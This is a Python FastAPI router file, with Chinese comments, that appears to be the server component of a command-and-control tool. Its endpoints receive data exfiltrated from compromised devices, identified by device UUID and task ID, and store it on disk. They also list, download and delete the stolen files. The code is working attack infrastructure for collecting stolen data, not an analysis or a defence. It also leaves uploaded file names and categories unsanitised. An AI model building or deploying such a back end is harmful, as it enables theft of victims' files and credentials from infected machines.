"""数据上传 API 路由"""

import base64
import os
from datetime import datetime
from pathlib import Path
from fastapi import APIRouter, Depends, HTTPException, UploadFile, File, Form
from sqlalchemy.orm import Session
from typing import List, Optional

from database import get_db
import crud, schemas
from models import Exfil
from config import get_config

config = get_config()
router = APIRouter(prefix="/api/upload", tags=["upload"])


def save_exfil_file(device_uuid: str, category: str, filename: str, content: str) -> str:
    """保存外泄文件到本地"""
    # 创建设备专属目录
    device_dir = config.EXFIL_DIR / device_uuid / category
    device_dir.mkdir(parents=True, exist_ok=True)
    
    # 生成文件名（带时间戳）
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_filename = f"{timestamp}_{filename}"
    file_path = device_dir / safe_filename
    
    # 解码并保存文件
    try:
        file_data = base64.b64decode(content)
        with open(file_path, "wb") as f:
            f.write(file_data)
        return str(file_path)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Failed to decode and save file: {str(e)}")


@router.post("")
def upload_exfil(
    device_uuid: str = Form(...),
    category: str = Form(...),
    path: Optional[str] = Form(None),
    description: Optional[str] = Form(None),
    file_size: Optional[int] = Form(None),
    content: Optional[str] = Form(None),
    mime_type: Optional[str] = Form(None),
    metadata: Optional[str] = Form(None),
    task_id: Optional[int] = Form(None),
    db: Session = Depends(get_db)
):
    """
    通用数据上传接口
    支持base64编码的内容上传
    """
    # 检查设备是否存在
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # 保存文件（如果有内容）
    file_path = None
    if content:
        filename = os.path.basename(path) if path else f"{category}_{device_uuid}.bin"
        file_path = save_exfil_file(device_uuid, category, filename, content)
    
    # 解析元数据
    import json
    parsed_metadata = None
    if metadata:
        try:
            parsed_metadata = json.loads(metadata)
        except json.JSONDecodeError:
            pass
    
    # 创建外泄记录
    exfil_data = schemas.ExfilUpload(
        device_uuid=device_uuid,
        category=category,
        path=path,
        description=description,
        file_size=file_size,
        content=content[:2048] if content else None,  # 只保存预览
        mime_type=mime_type,
        metadata=parsed_metadata,
        task_id=task_id
    )
    
    exfil = crud.create_exfil(db, exfil_data, file_path=file_path)
    
    return {"ok": True, "exfil_id": exfil.id, "file_path": file_path}


@router.post("/file")
async def upload_file(
    device_uuid: str = Form(...),
    category: str = Form(...),
    path: Optional[str] = Form(None),
    file: UploadFile = File(...),
    db: Session = Depends(get_db)
):
    """
    文件上传接口
    支持multipart/form-data文件上传
    """
    # 检查设备是否存在
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # 检查文件大小
    file_content = await file.read()
    if len(file_content) > config.MAX_UPLOAD_SIZE:
        raise HTTPException(status_code=413, detail="File too large")
    
    # 保存文件
    device_dir = config.EXFIL_DIR / device_uuid / category
    device_dir.mkdir(parents=True, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_filename = f"{timestamp}_{file.filename}"
    file_path = device_dir / safe_filename
    
    with open(file_path, "wb") as f:
        f.write(file_content)
    
    # 创建外泄记录
    exfil_data = schemas.ExfilUpload(
        device_uuid=device_uuid,
        category=category,
        path=path or file.filename,
        description=f"Uploaded file: {file.filename}",
        file_size=len(file_content),
        content=base64.b64encode(file_content[:512]).decode() if file_content else None,
        mime_type=file.content_type,
        task_id=None
    )
    
    exfil = crud.create_exfil(db, exfil_data, file_path=str(file_path))
    
    return {"ok": True, "exfil_id": exfil.id, "file_path": str(file_path)}


@router.get("/list/{device_uuid}", response_model=List[schemas.ExfilOut])
def list_device_exfil(device_uuid: str, skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    """获取设备外泄数据列表"""
    # 检查设备是否存在
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    return crud.get_device_exfil(db, device_uuid, skip=skip, limit=limit)


@router.get("/list", response_model=List[schemas.ExfilOut])
def list_all_exfil(skip: int = 0, limit: int = 100, category: str = None, db: Session = Depends(get_db)):
    """获取所有外泄数据列表"""
    if category:
        return crud.get_exfil_by_category(db, category, skip=skip, limit=limit)
    return crud.get_exfil(db, skip=skip, limit=limit)


@router.get("/download/{exfil_id}")
def download_exfil(exfil_id: int, db: Session = Depends(get_db)):
    """下载外泄文件"""
    from fastapi.responses import FileResponse
    
    exfil = db.query(Exfil).filter(
        Exfil.id == exfil_id
    ).first()
    
    if not exfil:
        raise HTTPException(status_code=404, detail="Exfil record not found")
    
    if not exfil.file_path or not os.path.exists(exfil.file_path):
        raise HTTPException(status_code=404, detail="File not found")
    
    return FileResponse(
        exfil.file_path,
        filename=os.path.basename(exfil.file_path),
        media_type=exfil.mime_type or "application/octet-stream"
    )


@router.delete("/{exfil_id}")
def delete_exfil(exfil_id: int, db: Session = Depends(get_db)):
    """删除外泄记录"""
    exfil = db.query(Exfil).filter(Exfil.id == exfil_id).first()
    
    if not exfil:
        raise HTTPException(status_code=404, detail="Exfil record not found")
    
    # 删除文件
    if exfil.file_path and os.path.exists(exfil.file_path):
        try:
            os.remove(exfil.file_path)
        except Exception:
            pass
    
    # 删除记录
    db.delete(exfil)
    db.commit()
    
    return {"ok": True, "message": "Exfil record deleted"}